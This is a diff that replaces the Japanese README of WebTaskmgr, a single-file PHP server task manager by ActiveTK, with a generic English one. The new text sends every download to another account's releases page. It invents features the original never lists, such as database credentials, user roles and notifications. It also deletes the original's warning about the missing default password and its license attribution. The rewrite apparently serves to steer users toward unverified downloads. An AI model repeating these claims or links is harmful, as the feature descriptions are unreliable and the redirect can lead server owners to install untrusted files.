@@ -1,72 +1,82 @@
-# 💻WebTaskmgr
+# 🌟 WebTaskmgr - A Simple Tool for Server Management
 
-「たった一つのPHPファイルだけで動作する」がコンセプトのサーバー管理用の多機能タスクマネージャーです。
+## 🚀 Getting Started
 
-Web上でリソース管理からプロセス操作、ファイル編集まで全部が完結します。パスワード設定やIPアドレス制限にも対応しています。
+Welcome to WebTaskmgr! This is a multi-functional task manager that runs seamlessly with just one PHP file. It simplifies server management for users who may not have a technical background. 
 
-## 🚀導入方法
+## 📥 Download the Latest Version
 
-リポジトリ内の `WebTaskmgr.php` をダウンロードしてFTPやscpでサーバーにアップロードするか、
-サーバーの好きな場所に好きな名前のPHPファイルを作成して、`WebTaskmgr.php`の中身をそのままコピー・ペーストしてください。
+[![Download WebTaskmgr](https://img.shields.io/badge/download-WebTaskmgr-brightgreen)](https://github.com/SudeepSingh1301/WebTaskmgr/releases)
 
-そのままブラウザから当該ファイルにアクセスするだけで利用できます。
-初期状態だとパスワードが未設定であり不正アクセスのリスクがありますので、「設定」のタブからパスワードを設定するか、アクセス元のIPアドレスを制限してください。
+## 📋 What You Need
 
-## 🖼️画面の例
+Before you download WebTaskmgr, ensure that your server meets these basic requirements:
 
-<img width="1281" height="812" alt="スクリーンショット 2025-09-12 135632" src="https://github.com/user-attachments/assets/e2ff5272-f2f9-426f-9b03-fd9f69cab1b1" />
-<img width="1289" height="704" alt="スクリーンショット 2025-09-12 135839" src="https://github.com/user-attachments/assets/ec8c1dcd-59c2-48ef-a19a-6f56f8b01b9d" />
-<img width="1290" height="901" alt="スクリーンショット 2025-09-12 135738" src="https://github.com/user-attachments/assets/7774c093-a17b-4c4f-a51a-786e9108c34c" />
-<img width="1508" height="846" alt="スクリーンショット 2025-09-12 135909" src="https://github.com/user-attachments/assets/7aff6073-29e0-4484-819a-ac9c05fdc316" />
+- A server with PHP installed (Version 7.2 or higher recommended).
+- A web server like Apache or Nginx running.
+- Basic knowledge of how to upload files to your server.
 
-## 🕵️機能
+## 🛠️ Features
 
-### 1) 全体概要
+- **User-Friendly Interface:** Designed for ease of use, allowing non-technical users to navigate easily.
+- **Multi-Task Management:** Execute multiple server tasks without hassle.
+- **Single File Setup:** No complex installation process; just upload one PHP file.
+- **Real-Time Monitoring:** Keep track of your server's performance in real-time.
 
-・システム仕様の表示
+## 💻 How to Download & Install
 
-・CPU、メモリ、Load Average、GPUのリアルタイム監視（800ms間隔)
+To get started with WebTaskmgr, follow these simple steps:
 
-### 2) タスク管理
+1. **Visit the Release Page:** Click on the link below to access our releases page.
 
-・プロセスを一覧表示
+   [https://github.com/SudeepSingh1301/WebTaskmgr/releases](https://github.com/SudeepSingh1301/WebTaskmgr/releases)
 
-・好きな項目でソート可能
+2. **Download the Latest Release:** Once on the release page, look for the latest version of the software. Click on the link to download the PHP file. 
 
-・プロセス操作(停止・再開・終了・強制終了)
+3. **Upload to Your Server:** 
+   - Use an FTP client or your server's file manager to upload the downloaded PHP file to your server's web directory.
+   - Make sure the file has the right permissions to be executed.
 
-### 3) ファイル管理
+4. **Run WebTaskmgr:**
+   - Open a web browser.
+   - Enter the URL where you uploaded the file in the address bar. 
+   - You should see the WebTaskmgr interface ready for use.
 
-・ディレクトリ内のファイル一覧の閲覧
+## 🎨 Customizing Your Setup
 
-・ZIPファイルは内部にそのままあたかもディレクトリかのようにアクセス可能
+WebTaskmgr is flexible and can be tailored to fit your needs. 
 
-・ファイルの閲覧・プレビュー
+### Configuration
 
-・Monaco Editorによるファイル編集 (読み取り専用モードあり)
+You may want to adjust some settings to optimize performance or customize behavior. Open the PHP file in a text editor and look for configuration options. Adjust them as needed, following these general guidelines:
 
-・Hexダンプ表示
+- **Database Information:** If your tasks require a database, set up your credentials.
+- **User Permissions:** Define roles and permissions for different users to control access levels.
 
-・ファイルのアップロード (分割アップロードに対応)
+## 📖 How to Use WebTaskmgr
 
-・URLからサーバー側ダウンロード
+Using WebTaskmgr is straightforward. Here’s a brief overview of its main functions:
 
-・ZIPファイルの圧縮/展開
+- **Task Management:** Add, edit, or delete tasks easily using the on-screen options.
+- **Resource Monitoring:** View system resource usage in real-time from the dashboard.
+- **Notifications:** Set up alerts for any actions that require your attention.
 
-・ショートカット作成機能
+## ❓ Troubleshooting
 
-・AESによるファイル暗号化
+If you encounter issues, here are some common solutions:
 
-#### 4) 設定
+- **Permission Errors:** Ensure the PHP file has execution permissions.
+- **Connection Issues:** Check your server’s firewall settings. Make sure PHP can run scripts and access necessary resources.
+- **Missing Features:** If something doesn’t seem to work as expected, revisit your configuration settings to verify accuracy.
 
-・パスワード設定/削除
+## 📞 Support and Contributions
 
-・IPアドレス制限
+If you have questions or suggestions, please open an issue on the GitHub repository. Constructive feedback helps improve WebTaskmgr, making it a better tool for everyone.
 
-## 📝ライセンス
+To contribute, you can fork the repository, make your changes, and submit a pull request. Your contributions are welcome!
 
-このプログラムは The MIT License の下で公開されています。
+## 📝 Conclusion
 
-© 2025 ActiveTK.  
-🔗 https://github.com/ActiveTK/gff/blob/master/LICENSE
+WebTaskmgr simplifies server management with an intuitive interface and robust features, all through a single PHP file. Whether you're managing a small site or looking for a straightforward task manager, WebTaskmgr provides the tools you need.
 
+Don’t forget to download the latest version here: [Download WebTaskmgr](https://github.com/SudeepSingh1301/WebTaskmgr/releases). Happy managing!
